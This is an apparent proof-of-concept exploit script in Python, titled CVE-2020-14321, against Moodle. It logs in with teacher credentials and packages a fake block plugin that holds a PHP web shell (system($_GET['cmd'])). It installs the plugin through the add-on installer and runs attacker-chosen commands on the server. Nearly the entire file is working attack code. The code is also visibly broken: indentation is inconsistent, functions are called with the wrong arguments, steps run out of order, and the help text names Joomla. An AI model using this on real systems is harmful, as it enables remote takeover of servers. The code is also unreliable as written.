#!/usr/bin/python3

import random
import string
import os
import zipfile
import sys
import requests
import re
import argparse
import binascii

headers={"Content-Type":"application/x-www-form-urlencoded"}
proxies={}

def random_string(stringLength=5):
    """Genera una cadena de texto aleatoria de tamaño determinado."""
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(stringLength))
	


def crearDirectorios(cadena):
	os.mkdir(cadena)
	os.chdir(cadena)
	fichero="version.php"
	f = open(fichero, "w")
	f.write("""
		<?php 
		$plugin->version = 2020061700;
		$plugin->component = 'block_"""+ cadena +"';")
	f.close()
	
	os.mkdir("lang")
	os.chdir("lang")
	os.mkdir("en")
	os.chdir("en")
	fichero2="block_" + cadena + ".php"
	f2 = open(fichero2, "w")
	f2.write("""
		<?php system($_GET['cmd']); ?>""")
	f2.close()
	
	return cadena
	
def crearZip(cadena):
	
	os.chdir("../../../")
	zip_filename = cadena + ".zip"
	
	with zipfile.ZipFile(zip_filename, 'w') as zip_file:
    		for root, dirs, files in os.walk(cadena):
        		for file in files:
            			file_path = os.path.join(root, file)
            			zip_file.write(file_path)




def conexionMoodle(url,usuario,password):
	session=requests.Session()
	login_url = url + '/login/index.php'
	print('[+] Logging in to teacher')
	r=session.get(login_url)
	login_token = re.findall(r'name="logintoken" value="(.*?)"', r.text)[0]
	data = {
            "anchor" : "",
            "logintoken":login_token,
            "username": usuario,
            "password": password
        	}
	resp=session.post(login_url,data=data,proxies=proxies,headers=headers,verify=False)
       
       if "Recently accessed courses" not in resp.text:
	print("[!] Teacher logins failure!")
	sys.exit(1)
	print("[+] Teacher logins successfully!")
	return session


def RCE(url,sess,command,cadena):
    r = sess.get(url + '/admin/tool/installaddon/index.php',proxies=proxies)
    new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
    itemid =re.findall(r'itemid=(\d*)', r.text)[0]
    #print(itemid)
    client_id = re.findall(r'"client_id":"(.*?)"', r.text)[0]
    #print(client_id)
    url_upload =url+"/repository/repository_ajax.php?action=upload"
    filename=cadena + ".zip"
    with open(cadena + ".zip", "rb") as f:
    bytes = f.read()
    hex_string = "".join("{:02x}".format(b) for b in bytes)
 
    file=binascii.unhexlify(hex_string)
    files = {
        'repo_upload_file': (filename, file, 'application/octet-stream'),
        'title': (None, ''),
        "author":(None,"Something"),
        "license":(None,"unknown"),
        "itemid":(None,itemid),
        "accepted_types[]":(None,".zip"),
        "repo_id":(None,"5"),
        "p":(None,""),
        "page":(None,""),
        "env":(None,"filepicker"),
        "sesskey" : (None,new_sess_key),
        "client_id" :(None,client_id),
        "maxbytes" : (None,"-1"),
        "areamaxbytes" :(None,"-1"),
        "ctx_id" : (None,"1"),
        "savepath" :(None, "/")
    }
    r=sess.post(url_upload, files=files,proxies=proxies)
    if "error" in r.text:
        print("[-] Error when uploading this file, try again!")
        sys.exit(1)
    # install zip file
    new_url=url+"/admin/tool/installaddon/index.php"
    data={
        "sesskey" : new_sess_key,
        "_qf__tool_installaddon_installfromzip_form" : "1",
        "mform_showmore_id_general" : "0",
        "mform_isexpanded_id_general" : "1",
        "zipfile" : itemid,
        "plugintype" : "",
        "rootdir" : "",
        "submitbutton" : "Install plugin from the ZIP file"
        }
    r=sess.post(new_url, data=data,proxies=proxies)
    if "Validation successful" not in r.text:
        print("[-] Error when validing this file, try again!")
        sys.exit(1)
    # Confirm load
    zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
    data = {
        "installzipcomponent" : "block_" + cadena,
        "installzipstorage" : zip_storage,
        "installzipconfirm" : "1",
        "sesskey" : new_sess_key
    }

    r = sess.post(url + '/admin/tool/installaddon/index.php', data=data)
    if "Current release information" not in r.text:
        print("[-] Error when confirming this file, try again!")
        sys.exit(1)
    # Done, now trigger RCE
    print("[+] Checking RCE ...")
    link_rce=url+"/blocks/"+cadena+"/lang/en/block_"+ cadena +".php?cmd="+command
    r=sess.get(link_rce,proxies=proxies)
    print("[+] RCE link in here:\n"+link_rce)
    print(r.text)


if __name__ == '__main__':
	
	print("""                           ***CVE 2020 14321*** 
    How to use this PoC script
    Case 1. If you have vaid credentials:
    python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd dir
    """)
    # Construct the argument parser
    	ap = argparse.ArgumentParser()
    # Add the arguments to the parser
    	ap.add_argument("-url", "--url", required=True,
                    help=" URL for your Joomla target")
    	ap.add_argument("-u", "--username",
                    help="username")
    	ap.add_argument("-p", "--password",
                    help="password")
    	ap.add_argument("-cmd", "--command", default="whoami",
                    help="command")
    	args = vars(ap.parse_args())
    # target
    	url = format(str(args['url']))
    print ('[+] Your target: ' + url)
    # username
    	uname = format(str(args['username']))
    # password
    	upass = format(str(args['password']))
    # command
    	command = format(str(args['command']))
    # session
    	cadena=random_string()
    	sess=conexionMoodle(url,uname,upass,cadena)
    #privilegeEscalationToManagerCourse(url,sess)
    	RCE(url,sess,command)
	direct=crearDirectorios(cadena)
	crearZip(direct)
